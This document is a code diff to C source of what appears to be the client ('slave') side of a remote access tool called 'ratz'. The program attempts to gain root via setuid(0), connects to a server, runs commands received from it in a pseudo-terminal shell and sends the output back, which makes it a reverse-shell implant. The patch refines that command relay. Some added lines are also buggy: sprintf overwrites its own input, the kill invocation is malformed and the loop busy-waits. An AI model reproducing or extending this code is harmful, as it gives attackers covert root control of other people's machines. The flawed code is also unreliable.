@@ -19,6 +19,8 @@
 # include "ratz.h"
 # include "slave.h"
 
+static int	commandline_finished = 0;
+
 void	connect_to_server(s_ratz* ratz)
 {
 	if ((ratz->server = socket(AF_INET, SOCK_STREAM, 0)) == -1)
@@ -74,6 +76,27 @@ int	try_set_root()
 	return (setuid(0) | setgid(0));
 }
 
+char*	strjoin(char* a, char* b)
+{
+	unsigned long	a_size = strlen(a);
+	unsigned long	b_size = strlen(b);
+	unsigned int	i = 0;
+	char*			new = malloc((a_size + b_size + 1) * sizeof(char));
+
+	for ( ; i < a_size ; ++i)
+		new[i] = a[i];
+	for (unsigned int j = 0 ; j < b_size ; ++j, ++i)
+		new[i] = b[j];
+	new[i] = 0;
+	return (new);
+}
+
+void	sigusr1_handling(int sig)
+{
+	if (sig == SIGUSR1)
+		commandline_finished = 1;
+}
+
 int	main(int, char** av)
 {
 	try_set_root();
@@ -102,21 +125,33 @@ int	main(int, char** av)
 	}
 	else
 	{
+		signal(SIGUSR1, sigusr1_handling);
+		unlink("DEBUG.out");
 		close(blue.slave);
 		char	cmd[DEBUG_SIZE_MAX] = {0};
 		int		n;
 		fcntl(blue.ratz.server, F_SETFL, ~O_NONBLOCK);
-		fcntl(blue.master, F_SETFL, ~O_NONBLOCK);
+		fcntl(blue.master, F_SETFL, O_NONBLOCK);
 		while (waitpid(chd, NULL, WNOHANG) == 0)
 		{
-			n = read(blue.ratz.server, cmd, DEBUG_SIZE_MAX);
-			cmd[n] = '\0';
+			memset(cmd, 0, DEBUG_SIZE_MAX);
+			read(blue.ratz.server, cmd, DEBUG_SIZE_MAX);
+			if (strcmp(cmd, "exit\n"))
+			{
+				n = sprintf(cmd, "%s ; kill -10 SIGUSR1 %d\n", cmd, getpid());
+				cmd[n] = 0;
+			}
+			//write(2, "command debug : ", 17);
+			//write(2, cmd, strlen(cmd));
+			cmd[n] = 0;
 			write(blue.master, cmd, n);
-			write(blue.master, "\n", 1);
-			sleep(1); // Better soon. How to know if a command-line has finished his execution ??
+			while (commandline_finished == 0)
+				; // make a nanosleep
 			n = read(blue.master, cmd, DEBUG_SIZE_MAX);
+			commandline_finished = 0;
 			cmd[n] = '\0';
 			write(blue.ratz.server, cmd, n);
+			write(blue.ratz.server, "\001", 2);
 		}
 	}
 	return (0);
